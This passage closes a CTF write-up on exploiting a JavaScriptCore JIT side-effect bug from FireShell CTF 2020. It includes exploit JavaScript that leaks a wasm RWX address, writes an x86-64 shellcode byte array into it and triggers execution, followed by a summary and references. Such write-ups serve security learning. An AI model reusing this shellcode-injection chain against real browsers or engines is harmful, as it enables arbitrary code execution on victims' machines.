Finally, inject `shellcode` to `rwx` memory in `wasm` object with the four primitives, and then trigger `shellcode` to execute arbitrary code:

```js
// leak rwx addr
let wasmObjAddr = NewAddrOf(wasmFunc);
print("[+] wasm obj addr: " + hex(wasmObjAddr));
let codeAddr = Read64(wasmObjAddr + 0x38);
let rwxAddr = Read64(codeAddr);
print("[+] rwx addr: " + hex(rwxAddr));

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
// write shellcode to rwx mem
ArbitraryWrite(rwxAddr, shellcode);

// trigger shellcode to execute
wasmFunc();
```

![calc](https://raw.githubusercontent.com/ray-cp/ray-cp.github.io/master/_img/2021-01-03-jsc-pwn-FireShell-ctf-2020-The-Return-of-the-Side-Effect-writeup/calc.png.png)

## 总结

Through out the debugging of the `CompareEq side effect` vulnerability, we can get a further understanding of the generation and elimination of `CheckStructure`, and the understanding of `jsc AbstractInterpreter` has also been further deepened.

Here are the related documents and scripts [link](https://github.com/ray-cp/browser_pwn/tree/master/jsc_pwn/FireShell-ctf-2020-The-Return-of-the-Side-Effect)



## Reference

1. [FireShell CTF 2020 Writeups](https://ptr-yudai.hatenablog.com/entry/2020/03/23/105837)
2. [FireShell ctf 2020 The return of Slide 复现](https://bbs.ichunqiu.com/thread-56589-1-1.html)
3. [INVERTING YOUR ASSUMPTIONS: A GUIDE TO JIT COMPARISONS](https://www.thezdi.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons)
4. [Thinking outside the JIT Compiler: Understanding and bypassing StructureID Randomization with generic and old-school methods](https:// i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods. pdf) 

